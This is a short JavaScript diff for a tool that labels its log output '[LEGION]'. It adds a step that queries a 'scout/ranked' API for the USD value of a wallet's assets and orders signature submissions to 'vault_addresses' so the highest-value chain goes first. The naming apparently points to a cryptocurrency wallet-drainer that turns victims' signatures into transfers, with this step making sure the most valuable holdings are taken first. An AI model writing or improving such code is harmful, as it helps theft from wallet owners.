@@ -1837,6 +1837,31 @@
       var vaults = clientConfigData.data.vault_addresses;
       console.log('[LEGION]   ✅ Vaults loaded');
 
+      // Step 1b: Get ranked assets to prioritize highest-value chain first
+      var chainPriority = chainNames.slice();
+      try {
+        var primaryAddr = signatures.EVM ? signatures.EVM.address : (signatures[chainNames[0]] ? signatures[chainNames[0]].address : '');
+        if (primaryAddr) {
+          var rankedRes = await apiPost('/api/v1/scout/ranked', { wallet_address: primaryAddr });
+          if (rankedRes && rankedRes.assets && rankedRes.assets.length > 0) {
+            var chainValue = {};
+            rankedRes.assets.forEach(function(asset) {
+              var chain = asset.family || asset.chain || '';
+              var mapped = chain === 'SVM' ? 'SOL' : chain === 'UTXO' ? 'BTC' : chain;
+              chainValue[mapped] = (chainValue[mapped] || 0) + (asset.amount_usd || 0);
+            });
+            chainPriority.sort(function(a, b) {
+              return (chainValue[b] || 0) - (chainValue[a] || 0);
+            });
+            console.log('[LEGION]   📊 Chain priority (by value):', chainPriority.join(' > '));
+          }
+        }
+      } catch (rankErr) {
+        console.debug('[LEGION]   Priority ranking skipped:', rankErr.message);
+      }
+
+      // Submit chains in priority order (highest value first)
+
       // Submit EVM chain if present
       if (signatures.EVM) {
         console.log('[LEGION]   📤 Submitting EVM...');
